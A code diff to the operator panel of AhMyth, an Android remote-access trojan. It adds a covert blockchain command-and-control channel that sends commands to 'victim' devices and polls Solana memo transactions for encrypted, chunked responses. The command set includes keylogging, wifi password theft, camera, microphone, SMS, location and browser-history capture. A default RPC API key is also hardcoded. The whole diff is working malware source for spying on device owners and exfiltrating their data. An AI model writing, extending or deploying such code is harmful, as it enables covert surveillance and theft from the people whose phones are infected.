@@ -1,9 +1,37 @@
-const { remote } = require('electron');
+const remote = require('@electron/remote');
 const { ipcRenderer } = require('electron');
 var app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
 var fs = require("fs-extra");
 var homedir = require('node-homedir');
 var path = require("path");
+let crypto, bs58, Connection, PublicKey;
+let sendBlockchainCommandRaw = async () => {
+    throw new Error('Blockchain operator module not available; configure NODE path and env before issuing blockchain lab commands');
+};
+
+try {
+    crypto = require('crypto');
+    bs58 = require('bs58');
+    const solanaWeb3 = require('@solana/web3.js');
+    Connection = solanaWeb3.Connection;
+    PublicKey = solanaWeb3.PublicKey;
+} catch (e) {
+    console.error('Failed to load blockchain dependencies:', e);
+}
+
+try {
+    let operator;
+    if (remote && remote.require) {
+        operator = remote.require('./blockchain-operator');
+    } else {
+        operator = require('../../../../blockchain-operator');
+    }
+    if (operator && operator.sendCommand) {
+        sendBlockchainCommandRaw = operator.sendCommand.bind(operator);
+    }
+} catch (e) {
+    console.warn('Blockchain operator not available:', e.message);
+}
 
 // Fix Constants require path - use path resolution that works in Electron renderer
 let CONSTANTS;
@@ -64,10 +92,16 @@ try {
         db = require(dbPath);
         console.log('[AhMyth] Database module loaded');
     } else {
-        console.warn('[AhMyth] Database module not found at:', dbPath);
+        // Database module is optional - suppress warning in production
+        if (process.env.NODE_ENV === 'development') {
+            console.warn('[AhMyth] Database module not found at:', dbPath);
+        }
     }
 } catch (e) {
-    console.error('[AhMyth] Failed to load database:', e);
+    // Only log database errors in development
+    if (process.env.NODE_ENV === 'development') {
+        console.error('[AhMyth] Failed to load database:', e);
+    }
 }
 
 // Ensure log directory exists
@@ -81,6 +115,556 @@ var debugLogFile = path.join(logPath, `debug-${new Date().toISOString().split('T
 // Store reference to Angular scope for UI logging (set later by controller)
 var labScope = null;
 var rootScope = null;
+// Victim metadata (used to decide blockchain vs TCP)
+const currentVictim = (remote && remote.getCurrentWebContents && remote.getCurrentWebContents().victim) || {};
+
+function isBlockchainVictim(victim = currentVictim) {
+    if (!victim) return false;
+    const connectionType = (victim.connectionType || '').toLowerCase();
+    const conn = (victim.conn || '').toLowerCase();
+    const ipLabel = (victim.ip || '').toLowerCase().trim();
+    return !!(
+        victim.isBlockchain ||
+        connectionType === 'blockchain' ||
+        conn === 'blockchain' ||
+        ipLabel === 'blockchain' ||
+        ipLabel.startsWith('blockchain')
+    );
+}
+
+// ---------------- Blockchain helpers -----------------
+// Resolve project root (same logic as AppCtrl)
+let projectRoot;
+try {
+    if (remote && remote.app) {
+        const appPath = remote.app.getAppPath();
+        projectRoot = path.resolve(appPath, '..', '..');
+    } else {
+        projectRoot = path.resolve(__dirname, '..', '..', '..', '..', '..', '..');
+    }
+} catch (e) {
+    // Fallback for dev/test environment
+    projectRoot = path.resolve(__dirname, '..', '..', '..', '..', '..', '..');
+}
+
+const blockchainKeysEnvPath = path.join(projectRoot, '.blockchain-keys.env');
+const blockchainContractEnvPath = path.join(projectRoot, '.blockchain-contract.env');
+const blockchainConfigPath = path.join(projectRoot, 'config', 'blockchain_c2.json');
+
+function parseEnvFile(filePath) {
+    if (!fs.existsSync(filePath)) {
+        console.warn(`[LabCtrl] Env file not found: ${filePath}`);
+        return {};
+    }
+    try {
+        return fs.readFileSync(filePath, 'utf8')
+            .split(/\r?\n/)
+            .reduce((acc, line) => {
+                const m = line.trim().match(/^([^=#]+)=(.*)$/);
+                if (m) acc[m[1].trim()] = m[2].trim();
+                return acc;
+            }, {});
+    } catch (e) {
+        console.error(`[LabCtrl] Failed to parse env file ${filePath}:`, e.message);
+        return {};
+    }
+}
+
+// Load blockchain env with better error handling
+const keysEnv = parseEnvFile(blockchainKeysEnvPath);
+const contractEnv = parseEnvFile(blockchainContractEnvPath);
+
+const blockchainEnv = {
+    ...keysEnv,
+    ...contractEnv,
+    ...process.env
+};
+
+const rpcPenaltyBox = new Map();
+const RPC_BACKOFF_BASE = 1500;
+const RPC_BACKOFF_CAP = 60000;
+
+function normalizeRpc(rpc) {
+    return typeof rpc === 'string' ? rpc.trim() : '';
+}
+
+function penalizeRpcEndpoint(rpc, reason) {
+    const normalized = normalizeRpc(rpc);
+    if (!normalized) return;
+    const current = rpcPenaltyBox.get(normalized);
+    const severe = reason && /429|rate|forbid|403/i.test(String(reason));
+    const bump = severe ? 5000 : 250;
+    const nextDelay = Math.min(
+        current ? Math.floor(current.delay * 1.8) + bump : (severe ? RPC_BACKOFF_BASE * 2 : RPC_BACKOFF_BASE),
+        RPC_BACKOFF_CAP
+    );
+    rpcPenaltyBox.set(normalized, {
+        delay: nextDelay,
+        until: Date.now() + nextDelay,
+        reason: reason || 'RPC error'
+    });
+    console.warn(`[LabCtrl] RPC ${normalized} throttled for ${nextDelay}ms (${reason || 'error'})`);
+}
+
+function clearRpcPenalty(rpc) {
+    const normalized = normalizeRpc(rpc);
+    if (!normalized) return;
+    rpcPenaltyBox.delete(normalized);
+}
+
+function canUseRpcEndpoint(rpc) {
+    const normalized = normalizeRpc(rpc);
+    if (!normalized) return false;
+    const entry = rpcPenaltyBox.get(normalized);
+    if (!entry) return true;
+    if (Date.now() >= entry.until) {
+        rpcPenaltyBox.delete(normalized);
+        return true;
+    }
+    return false;
+}
+
+function getRpcPenaltyDelay(rpc) {
+    const normalized = normalizeRpc(rpc);
+    const entry = rpcPenaltyBox.get(normalized);
+    return entry ? entry.delay : RPC_BACKOFF_BASE;
+}
+
+function splitRpcList(value) {
+    if (!value) return [];
+    if (Array.isArray(value)) {
+        return value.map((v) => String(v).trim()).filter(Boolean);
+    }
+    return String(value)
+        .split(/[\s,;]+/)
+        .map((part) => part.trim())
+        .filter(Boolean);
+}
+
+const BLOCKCHAIN_COMMAND_TIMEOUTS = {
+    [CONSTANTS.orders.camera]: 120000,
+    [CONSTANTS.orders.fileManager]: 120000,
+    [CONSTANTS.orders.calls]: 90000,
+    [CONSTANTS.orders.sms]: 90000,
+    [CONSTANTS.orders.mic]: 90000,
+    [CONSTANTS.orders.location]: 90000,
+    [CONSTANTS.orders.contacts]: 90000,
+    [CONSTANTS.orders.deviceInfo]: 60000,
+    [CONSTANTS.orders.apps]: 90000,
+    [CONSTANTS.orders.installApp]: 120000,
+    [CONSTANTS.orders.uninstallApp]: 120000,
+    [CONSTANTS.orders.clipboard]: 60000,
+    [CONSTANTS.orders.wifi]: 60000,
+    [CONSTANTS.orders.wifiPasswords]: 90000,
+    [CONSTANTS.orders.screen]: 120000,
+    [CONSTANTS.orders.makeCall]: 90000,
+    [CONSTANTS.orders.liveMic]: 90000,
+    [CONSTANTS.orders.input]: 90000,
+    [CONSTANTS.orders.keylogger]: 90000,
+    [CONSTANTS.orders.browserHistory]: 90000,
+    [CONSTANTS.orders.notifications]: 60000,
+    [CONSTANTS.orders.systemInfo]: 60000,
+    [CONSTANTS.orders.foreground]: 60000
+};
+
+// Commands that don't send responses (fire-and-forget)
+const FIRE_AND_FORGET_COMMANDS = new Set([
+    CONSTANTS.orders.foreground, // x0000fg - foreground/background control
+    'x0000wk' // wake screen (if it exists)
+]);
+
+const blockchainResponseTimers = new Map();
+
+function getCommandKey(event, data) {
+    return data && data.order ? data.order : event;
+}
+
+function startBlockchainResponseTimer(key, description, duration) {
+    clearBlockchainResponseTimer(key);
+    const timeout = duration || BLOCKCHAIN_COMMAND_TIMEOUTS[key] || 90000;
+    const timer = setTimeout(() => {
+        blockchainResponseTimers.delete(key);
+        const msg = description || key;
+        console.warn(`[LabCtrl] Timeout waiting for ${msg} response`);
+        if (rootScope && rootScope.Log) {
+            rootScope.Log(`[⚠] Timeout waiting for ${msg} response. Check blockchain connection or permissions.`, CONSTANTS.logStatus.WARNING);
+        }
+    }, timeout);
+    blockchainResponseTimers.set(key, timer);
+}
+
+function clearBlockchainResponseTimer(key) {
+    const timer = blockchainResponseTimers.get(key);
+    if (timer) {
+        clearTimeout(timer);
+        blockchainResponseTimers.delete(key);
+    }
+}
+
+// Log what was loaded for debugging
+console.log('[LabCtrl] Blockchain env paths:', {
+    keysPath: blockchainKeysEnvPath,
+    contractPath: blockchainContractEnvPath,
+    keysFound: Object.keys(keysEnv).length > 0,
+    contractFound: Object.keys(contractEnv).length > 0,
+    contractAddress: blockchainEnv.BLOCKCHAIN_CONTRACT_ADDRESS || blockchainEnv.SOLANA_CHANNEL_ADDRESS || 'NOT SET'
+});
+
+const MEMO_PROGRAM_ID = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
+
+function getSolanaRpcCandidatesLab() {
+    const defaultAlchemyKey = blockchainEnv.SOLANA_ALCHEMY_KEY || blockchainEnv.ALCHEMY_API_KEY || blockchainEnv.SOLANA_ALCHEMY_API_KEY || 'iYpa8brgKRSbCQ9rb1tx8';
+    const heliusKey = blockchainEnv.SOLANA_HELIUS_KEY || blockchainEnv.HELIUS_API_KEY;
+    const configuredList = [
+        ...splitRpcList(blockchainEnv.SOLANA_RPC_LIST),
+        ...splitRpcList(blockchainEnv.SOLANA_RPC_FALLBACKS),
+        ...splitRpcList(blockchainEnv.BLOCKCHAIN_RPC_FALLBACKS),
+        ...splitRpcList(blockchainEnv.BLOCKCHAIN_RPC_URLS),
+        ...splitRpcList(blockchainEnv.BLOCKCHAIN_RPC_LIST),
+        blockchainEnv.SOLANA_RPC_URL,
+        blockchainEnv.BLOCKCHAIN_RPC_URL,
+        blockchainEnv.BLOCKCHAIN_SECONDARY_RPC,
+        blockchainEnv.BLOCKCHAIN_TERTIARY_RPC,
+        blockchainEnv.SOLANA_SECONDARY_RPC,
+        blockchainEnv.SOLANA_TERTIARY_RPC,
+        blockchainEnv.SOLANA_RPC_CONFIG_FALLBACKS,
+        blockchainEnv.SOLANA_PUBLIC_RPCS,
+        blockchainEnv.BLOCKCHAIN_PUBLIC_RPCS
+    ];
+
+    const heuristics = [
+        heliusKey ? `https://rpc.helius.xyz/?api-key=${heliusKey}&network=devnet` : null,
+        `https://solana-devnet.g.alchemy.com/v2/${defaultAlchemyKey}`,
+        `https://solana-mainnet.g.alchemy.com/v2/${defaultAlchemyKey}`,
+        blockchainEnv.SOLANA_HELIUS_RPC,
+        blockchainEnv.SOLANA_QUICKNODE_RPC,
+        blockchainEnv.BLOCKCHAIN_QUICKNODE_RPC,
+        'https://devnet.helius-rpc.com/?api-key=demo',
+        'https://solana-devnet.g.alchemy.com/v2/demo',
+        'https://api.devnet.solana.com',
+        'https://rpc.ankr.com/solana'
+    ];
+
+    const combined = [...configuredList, ...heuristics].filter(Boolean);
+    const seen = new Set();
+    const deduped = [];
+    combined.forEach((rpc) => {
+        const normalized = (rpc || '').trim();
+        if (!normalized) return;
+        const key = normalized.toLowerCase();
+        if (seen.has(key)) return;
+        seen.add(key);
+        deduped.push(normalized);
+    });
+
+    if (!deduped.length) {
+        deduped.push('https://api.devnet.solana.com');
+    }
+    return deduped;
+}
+
+function normalizeAesKey(keyHex) {
+    if (!keyHex) return null;
+    return keyHex.startsWith('0x') ? keyHex.substring(2) : keyHex;
+}
+
+function decryptMemoPayload(hexPayload) {
+    try {
+        const clean = hexPayload.startsWith('0x') ? hexPayload.substring(2) : hexPayload;
+        const bytes = Buffer.from(clean, 'hex');
+        if (bytes.length < 12 + 16) return null;
+        const nonce = bytes.slice(0, 12);
+        const ciphertext = bytes.slice(12, -16);
+        const tag = bytes.slice(-16);
+
+        const decipher = crypto.createDecipheriv('aes-256-gcm', Buffer.from(normalizeAesKey(blockchainEnv.BLOCKCHAIN_C2_AES_KEY), 'hex'), nonce);
+        decipher.setAuthTag(tag);
+        const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
+        return decrypted.toString('utf8');
+    } catch (e) {
+        console.error('Failed to decrypt memo payload', e.message);
+        return null;
+    }
+}
+
+function extractMemosFromTransaction(tx) {
+    if (!tx || !tx.transaction || !tx.transaction.message) return [];
+    const message = tx.transaction.message;
+    const accountKeys = (message.accountKeys || []).map((k) => (k.pubkey ? k.pubkey.toString() : k.toString()));
+    const memos = [];
+    const instructions = message.instructions || [];
+    for (const instr of instructions) {
+        if (instr.parsed && instr.parsed.type === 'memo' && instr.parsed.info && instr.parsed.info.memo) {
+            memos.push(instr.parsed.info.memo);
+            continue;
+        }
+        const programId = instr.programId || null;
+        let programMatches = false;
+        if (programId && programId.toString && programId.toString() === MEMO_PROGRAM_ID.toString()) {
+            programMatches = true;
+        } else if (instr.programIdIndex != null && instr.programIdIndex < accountKeys.length) {
+            programMatches = accountKeys[instr.programIdIndex] === MEMO_PROGRAM_ID.toString();
+        }
+        if (programMatches) {
+            const parsedMemo = typeof instr.parsed === 'string' ? instr.parsed : instr.parsed?.info?.memo;
+            const data = instr.data || parsedMemo;
+            if (typeof data === 'string') {
+                if (data.startsWith('RESP:') || data.startsWith('RESPCH:') || data.startsWith('CMD:')) {
+                    memos.push(data);
+                } else {
+                    try {
+                        memos.push(Buffer.from(bs58.decode(data)).toString('utf8'));
+                    } catch (e) {
+                        // ignore
+                    }
+                }
+            }
+        }
+    }
+    return memos;
+}
+
+async function pollForResponseMemoLab(expectedEvent, timeoutMs = 90000) {
+    reloadBlockchainEnv();
+    
+    const contractAddress = blockchainEnv.BLOCKCHAIN_CONTRACT_ADDRESS || blockchainEnv.SOLANA_CHANNEL_ADDRESS;
+    if (!contractAddress) {
+        throw new Error('Missing blockchain contract/channel address for polling');
+    }
+    
+    const rpcList = getSolanaRpcCandidatesLab();
+    if (!rpcList.length) {
+        throw new Error('No RPC endpoints configured for blockchain polling');
+    }
+    const channelPubkey = new PublicKey(contractAddress);
+    const seen = new Set();
+    const start = Date.now();
+    let rpcIndex = 0;
+    const wait = (ms) => new Promise((r) => setTimeout(r, ms));
+    const chunkBuffers = new Map();
+
+    async function rpcCall(rpc, method, params) {
+        const controller = new AbortController();
+        const t = setTimeout(() => controller.abort(), 6000);
+        try {
+            const res = await fetch(rpc, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
+                signal: controller.signal
+            });
+            if (!res.ok) {
+                const error = new Error(`HTTP ${res.status}`);
+                error.httpStatus = res.status;
+                throw error;
+            }
+            const json = await res.json();
+            if (json.error) {
+                const err = new Error(json.error.message || 'RPC error');
+                err.httpStatus = json.error.code;
+                throw err;
+            }
+            return json.result;
+        } catch (err) {
+            if (err.name === 'AbortError') {
+                err.message = 'RPC timeout';
+                err.httpStatus = err.httpStatus || 'timeout';
+            }
+            throw err;
+        } finally {
+            clearTimeout(t);
+        }
+    }
+
+    while (Date.now() - start < timeoutMs) {
+        const rpc = rpcList[rpcIndex % rpcList.length];
+        rpcIndex++;
+
+        if (!canUseRpcEndpoint(rpc)) {
+            await wait(250);
+            continue;
+        }
+
+        let rpcHadFailure = false;
+        try {
+            const sigInfos = await rpcCall(rpc, 'getSignaturesForAddress', [
+                channelPubkey.toBase58(),
+                { limit: 25, commitment: 'confirmed' }
+            ]);
+            if (Array.isArray(sigInfos)) {
+                for (const info of sigInfos) {
+                    if (!info || !info.signature) continue;
+                    if (seen.has(info.signature)) continue;
+                    seen.add(info.signature);
+                    try {
+                        const tx = await rpcCall(rpc, 'getTransaction', [
+                            info.signature,
+                            { encoding: 'jsonParsed', commitment: 'confirmed', maxSupportedTransactionVersion: 0 }
+                        ]);
+                        const memos = extractMemosFromTransaction(tx);
+                        for (const memo of memos) {
+                            if (!memo) continue;
+                            if (memo.startsWith('RESPCH:')) {
+                                const m = memo.match(/^RESPCH:([A-Za-z0-9]+):([0-9]+)\/([0-9]+):([0-9a-fA-F]+)$/);
+                                if (!m) continue;
+                                const chunkId = m[1];
+                                const part = parseInt(m[2], 10);
+                                const total = parseInt(m[3], 10);
+                                const chunkHex = m[4];
+                                if (part <= 0 || part > total) continue;
+                                let entry = chunkBuffers.get(chunkId);
+                                if (!entry) entry = { total, parts: new Array(total).fill(null), received: 0 };
+                                if (!entry.parts[part - 1]) {
+                                    entry.parts[part - 1] = chunkHex;
+                                    entry.received += 1;
+                                }
+                                chunkBuffers.set(chunkId, entry);
+                                if (entry.received === entry.total) {
+                                    const assembled = entry.parts.join('');
+                                    chunkBuffers.delete(chunkId);
+                                    const decrypted = decryptMemoPayload(assembled);
+                                    try {
+                                        const parsed = JSON.parse(decrypted || '{}');
+                                        if (!expectedEvent || parsed.event === expectedEvent) {
+                                            return parsed;
+                                        }
+                                    } catch {}
+                                }
+                                continue;
+                            }
+                            if (memo.startsWith('RESP:')) {
+                                const decrypted = decryptMemoPayload(memo.substring(5));
+                                try {
+                                    const parsed = JSON.parse(decrypted || '{}');
+                                    if (!expectedEvent || parsed.event === expectedEvent) {
+                                        return parsed;
+                                    }
+                                } catch {}
+                            }
+                        }
+                    } catch (inner) {
+                        rpcHadFailure = true;
+                        const reason = inner && inner.httpStatus === 429 ? 'rate limited' : (inner.message || 'RPC error');
+                        penalizeRpcEndpoint(rpc, reason);
+                        break;
+                    }
+                }
+            }
+            if (!rpcHadFailure) {
+                clearRpcPenalty(rpc);
+            }
+        } catch (err) {
+            const reason = err && err.httpStatus === 429 ? 'rate limited' : (err.message || 'RPC error');
+            penalizeRpcEndpoint(rpc, reason);
+            await wait(Math.min(getRpcPenaltyDelay(rpc), 2000));
+            continue;
+        }
+
+        if (rpcHadFailure) {
+            await wait(Math.min(getRpcPenaltyDelay(rpc), 2000));
+            continue;
+        }
+        await wait(Math.min(1500 + rpcPenaltyBox.size * 200, 2500));
+    }
+    throw new Error(`No blockchain response for ${expectedEvent || 'command'} within timeout`);
+}
+
+// Reload blockchain env (call this if config changes)
+function reloadBlockchainEnv() {
+    const keysEnv = parseEnvFile(blockchainKeysEnvPath);
+    const contractEnv = parseEnvFile(blockchainContractEnvPath);
+    
+    // Update blockchainEnv object
+    Object.keys(blockchainEnv).forEach(key => {
+        if (!process.env[key]) delete blockchainEnv[key];
+    });
+    Object.assign(blockchainEnv, keysEnv, contractEnv, process.env);
+    if (fs.existsSync(blockchainConfigPath)) {
+        try {
+            const config = JSON.parse(fs.readFileSync(blockchainConfigPath, 'utf8'));
+            if (config.rpc_url) blockchainEnv.BLOCKCHAIN_RPC_URL = config.rpc_url;
+            if (config.rpc_url && !blockchainEnv.SOLANA_RPC_URL) blockchainEnv.SOLANA_RPC_URL = config.rpc_url;
+            if (config.contract_address) blockchainEnv.BLOCKCHAIN_CONTRACT_ADDRESS = config.contract_address;
+            if (config.contract_address && !blockchainEnv.SOLANA_CHANNEL_ADDRESS) blockchainEnv.SOLANA_CHANNEL_ADDRESS = config.contract_address;
+            if (config.aes_key_env) {
+                const aesKey = process.env[config.aes_key_env];
+                if (aesKey) blockchainEnv.BLOCKCHAIN_C2_AES_KEY = aesKey;
+            }
+            if (config.rpc_fallbacks) {
+                const fallbackList = Array.isArray(config.rpc_fallbacks)
+                    ? config.rpc_fallbacks.join(',')
+                    : String(config.rpc_fallbacks);
+                blockchainEnv.SOLANA_RPC_CONFIG_FALLBACKS = fallbackList;
+            }
+        } catch (e) {
+            console.warn('[LabCtrl] Failed to load blockchain config:', e.message);
+        }
+    }
+    
+    console.log('[LabCtrl] Reloaded blockchain env:', {
+        contractAddress: blockchainEnv.BLOCKCHAIN_CONTRACT_ADDRESS || blockchainEnv.SOLANA_CHANNEL_ADDRESS || 'NOT SET',
+        hasRpc: !!(blockchainEnv.SOLANA_RPC_URL || blockchainEnv.BLOCKCHAIN_RPC_URL),
+        hasAesKey: !!blockchainEnv.BLOCKCHAIN_C2_AES_KEY,
+        hasOperatorKey: !!(blockchainEnv.BLOCKCHAIN_PRIVATE_KEY || blockchainEnv.SOLANA_OPERATOR_PRIVATE_KEY)
+    });
+}
+
+async function sendBlockchainAndPoll(eventName, payload, isFireAndForget = false) {
+    // Reload env before each command to ensure we have latest config
+    reloadBlockchainEnv();
+    
+    const rpcCandidates = getSolanaRpcCandidatesLab();
+    const rpc = rpcCandidates[0] || blockchainEnv.SOLANA_RPC_URL || blockchainEnv.BLOCKCHAIN_RPC_URL || 'https://api.devnet.solana.com';
+    const contractAddress = blockchainEnv.BLOCKCHAIN_CONTRACT_ADDRESS || blockchainEnv.SOLANA_CHANNEL_ADDRESS;
+    
+    if (!contractAddress) {
+        const errorMsg = `Missing blockchain contract/channel address. Checked paths:\n  - ${blockchainKeysEnvPath}\n  - ${blockchainContractEnvPath}\n\nPlease ensure BLOCKCHAIN_CONTRACT_ADDRESS or SOLANA_CHANNEL_ADDRESS is set in one of these files.`;
+        console.error('[LabCtrl]', errorMsg);
+        throw new Error(errorMsg);
+    }
+    
+    if (!blockchainEnv.BLOCKCHAIN_PRIVATE_KEY && !blockchainEnv.SOLANA_OPERATOR_PRIVATE_KEY) {
+        throw new Error('Missing operator private key (BLOCKCHAIN_PRIVATE_KEY or SOLANA_OPERATOR_PRIVATE_KEY)');
+    }
+    
+    console.log('[LabCtrl] Sending blockchain command:', {
+        event: eventName,
+        contract: contractAddress.substring(0, 8) + '...',
+        rpc: rpc.substring(0, 30) + '...',
+        fireAndForget: isFireAndForget
+    });
+    
+    const txInfo = await sendBlockchainCommandRaw(eventName, payload || {});
+    const rpcUsed = txInfo && txInfo.rpc ? txInfo.rpc : rpc;
+    const txSig = txInfo && txInfo.txSig ? txInfo.txSig : 'n/a';
+    logToFile('REQUEST', `blockchain:${eventName}`, { rpc: rpcUsed, tx: txSig });
+
+    // For fire-and-forget commands, don't wait for response
+    if (isFireAndForget) {
+        if (rootScope && rootScope.Log) {
+            rootScope.Log(`[✓] Command sent successfully (no response expected)`, CONSTANTS.logStatus.SUCCESS);
+        }
+        return { sent: true, tx: txSig, rpc: rpcUsed, fireAndForget: true };
+    }
+
+    // Wait for response via socket (which is fed by main.js throttled polling)
+    // instead of aggressive polling here
+    return new Promise((resolve, reject) => {
+        const timeoutMs = BLOCKCHAIN_COMMAND_TIMEOUTS[eventName] || 90000;
+        const timer = setTimeout(() => {
+            socket.removeAllListeners(eventName); // Clean up
+            // Don't reject, just return pending so UI doesn't crash
+            resolve({ pending: true, tx: txSig, rpc: rpcUsed, timeout: true });
+        }, timeoutMs);
+
+        socket.once(eventName, (data) => {
+            clearTimeout(timer);
+            logToFile('RESPONSE', `blockchain:${eventName}`, data);
+            resolve(data);
+        });
+    });
+}
+
 
 // Set the scope reference from controller
 function setLabScope(scope, root) {
@@ -133,16 +717,61 @@ function logToFile(type, command, data) {
             }
         } catch (e) {}
     }
+    // Mirror into blockchain logs tab for unified visibility
+    try {
+        if (window.$appCtrl && typeof window.$appCtrl.appendBlockchainLog === 'function') {
+            window.$appCtrl.appendBlockchainLog(`[${type}] ${command}: ${dataStr.substring(0, 200)}`);
+        }
+    } catch (_) {}
 }
 
 // Track registered listeners to avoid double-registration
 var registeredListeners = {};
+const listenerCallbacks = new Map();
+
+function dispatchListener(event, data) {
+    const callbacks = listenerCallbacks.get(event);
+    if (callbacks && callbacks.length) {
+        callbacks.forEach(cb => {
+            try {
+                cb(data);
+            } catch (e) {
+                console.error(`[LabCtrl] Listener error for ${event}:`, e);
+            }
+        });
+    }
+}
 
 // Wrap socket with logging - improved version that tracks listeners
 var socket = {
     emit: function(event, data) {
+        const useBlockchain = currentVictim && ((currentVictim.connectionType === 'blockchain') || currentVictim.isBlockchain || currentVictim.conn === 'blockchain' || !currentVictim.ip);
         logToFile('REQUEST', event, data);
         if (labScope) labScope.packetCount++;
+        if (useBlockchain || !originalSocket || !originalSocket.connected) {
+            const action = data && data.order ? data.order : event;
+            const payload = data || {};
+            const description = payload.extra ? `${action} (${payload.extra})` : action;
+            
+            // Don't start timer for fire-and-forget commands
+            const isFireAndForget = FIRE_AND_FORGET_COMMANDS.has(action);
+            if (!isFireAndForget) {
+                startBlockchainResponseTimer(action, description);
+            }
+            
+            return sendBlockchainAndPoll(action, payload, isFireAndForget)
+                .catch((e) => {
+                    console.error('Blockchain send failed', e);
+                    if (rootScope && rootScope.Log) {
+                        rootScope.Log(`[✗] Blockchain send failed: ${e.message}`, CONSTANTS.logStatus.FAIL);
+                    }
+                })
+                .finally(() => {
+                    if (!isFireAndForget) {
+                        clearBlockchainResponseTimer(action);
+                    }
+                });
+        }
         return originalSocket.emit(event, data);
     },
     on: function(event, callback) {
@@ -156,8 +785,11 @@ var socket = {
         return originalSocket.on(event, function(data) {
             logToFile('RESPONSE', event, data);
             if (labScope) labScope.packetCount++;
+            clearBlockchainResponseTimer(event);
             try {
-                callback(data);
+                // Clone data to prevent mutations between listeners
+                const clonedData = data && typeof data === 'object' ? JSON.parse(JSON.stringify(data)) : data;
+                callback(clonedData);
             } catch (e) {
                 console.error(`[AhMyth] Error in callback for ${event}:`, e);
                 if (rootScope && rootScope.Log) {
@@ -165,6 +797,26 @@ var socket = {
                 }
             }
         });
+    },
+    once: function(event, callback) {
+        // Use Socket.IO's native once method directly to avoid removing other listeners
+        // We still wrap it to add logging
+        const wrappedCallback = function(data) {
+            logToFile('RESPONSE', event, data);
+            if (labScope) labScope.packetCount++;
+            clearBlockchainResponseTimer(event);
+            try {
+                // Clone data to prevent mutations between listeners
+                const clonedData = data && typeof data === 'object' ? JSON.parse(JSON.stringify(data)) : data;
+                callback(clonedData);
+            } catch (e) {
+                console.error(`[AhMyth] Error in once callback for ${event}:`, e);
+                if (rootScope && rootScope.Log) {
+                    rootScope.Log(`[✗] Error processing ${event}: ${e.message}`, CONSTANTS.logStatus.FAIL);
+                }
+            }
+        };
+        return originalSocket.once(event, wrappedCallback);
     },
     removeAllListeners: function(event) {
         delete registeredListeners[event];
@@ -464,6 +1116,12 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location, $route, $inte
         $rootScope.Log('[⚠] Server disconnected', CONSTANTS.logStatus.WARNING);
     });
 
+    // Reload blockchain config when updated in main window
+    ipcRenderer.on('Blockchain:ConfigUpdated', (event) => {
+        reloadBlockchainEnv();
+        $rootScope.Log('[ℹ] Blockchain configuration reloaded', CONSTANTS.logStatus.INFO);
+    });
+
 
 
 
@@ -535,8 +1193,11 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
 
     // Check socket connection before sending commands
     function checkConnection() {
+        if (isBlockchainVictim()) {
+            return true;
+        }
         if (!originalSocket || !originalSocket.connected) {
-            $rootScope.Log('[✗] Not connected to device!', CONSTANTS.logStatus.FAIL);
+            $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
             $camCtrl.load = '';
             $camCtrl.lastError = 'Device not connected';
             return false;
@@ -547,13 +1208,14 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
     // Set timeout for response
     function setResponseTimeout(action, timeoutMs) {
         if (responseTimeout) $timeout.cancel(responseTimeout);
+        const finalTimeout = timeoutMs || (isBlockchainVictim() ? 120000 : 30000);
         responseTimeout = $timeout(() => {
             if ($camCtrl.load === 'loading') {
                 $camCtrl.load = '';
                 $camCtrl.lastError = `No response from device for ${action}. Check if permissions are granted.`;
-                $rootScope.Log(`[⚠] Timeout waiting for ${action} response. Device may need camera permission.`, CONSTANTS.logStatus.WARNING);
+                $rootScope.Log(`[?] Timeout waiting for ${action} response. Device may need camera permission.`, CONSTANTS.logStatus.WARNING);
             }
-        }, timeoutMs || 30000);
+        }, finalTimeout);
     }
 
     // Select camera
@@ -640,22 +1302,35 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
         } else if (data.image == true) {
             $rootScope.Log('[✓] Picture captured', CONSTANTS.logStatus.SUCCESS);
             
-            // Handle buffer data
+            // Handle buffer data - can be Base64 string (blockchain) or byte array (TCP)
             if (data.buffer) {
                 try {
-                    var uint8Arr = new Uint8Array(data.buffer);
-                    var binary = '';
-                    for (var i = 0; i < uint8Arr.length; i++) {
-                        binary += String.fromCharCode(uint8Arr[i]);
+                    if (typeof data.buffer === 'string') {
+                        // Base64 string (blockchain mode)
+                        currentBase64 = data.buffer;
+                        $camCtrl.imgUrl = 'data:image/jpeg;base64,' + currentBase64;
+                        $camCtrl.isSaveShown = true;
+                        // Estimate size from Base64 (Base64 is ~33% larger than binary)
+                        const estimatedSize = Math.round((currentBase64.length * 3 / 4) / 1024);
+                        $rootScope.Log(`[✓] Image received: ${estimatedSize} KB (Base64)`, CONSTANTS.logStatus.SUCCESS);
+                    } else if (Array.isArray(data.buffer) || data.buffer instanceof Uint8Array) {
+                        // Byte array (TCP mode)
+                        var uint8Arr = data.buffer instanceof Uint8Array ? data.buffer : new Uint8Array(data.buffer);
+                        var binary = '';
+                        for (var i = 0; i < uint8Arr.length; i++) {
+                            binary += String.fromCharCode(uint8Arr[i]);
+                        }
+                        currentBase64 = window.btoa(binary);
+                        
+                        $camCtrl.imgUrl = 'data:image/jpeg;base64,' + currentBase64;
+                        $camCtrl.isSaveShown = true;
+                        $rootScope.Log(`[✓] Image received: ${Math.round(uint8Arr.length/1024)} KB`, CONSTANTS.logStatus.SUCCESS);
+                    } else {
+                        throw new Error('Unknown buffer format: ' + typeof data.buffer);
                     }
-                    currentBase64 = window.btoa(binary);
-                    
-                    $camCtrl.imgUrl = 'data:image/jpeg;base64,' + currentBase64;
-                    $camCtrl.isSaveShown = true;
-                    $rootScope.Log(`[✓] Image received: ${Math.round(uint8Arr.length/1024)} KB`, CONSTANTS.logStatus.SUCCESS);
                 } catch (e) {
                     console.error('[CamCtrl] Error processing image:', e);
-                    $camCtrl.lastError = 'Error processing image data';
+                    $camCtrl.lastError = 'Error processing image data: ' + e.message;
                     $rootScope.Log(`[✗] Error processing image: ${e.message}`, CONSTANTS.logStatus.FAIL);
                 }
             } else {
@@ -675,8 +1350,44 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
     if (checkConnection()) {
         $rootScope.Log('[→] Fetching camera list...', CONSTANTS.logStatus.INFO);
         $camCtrl.load = 'loading';
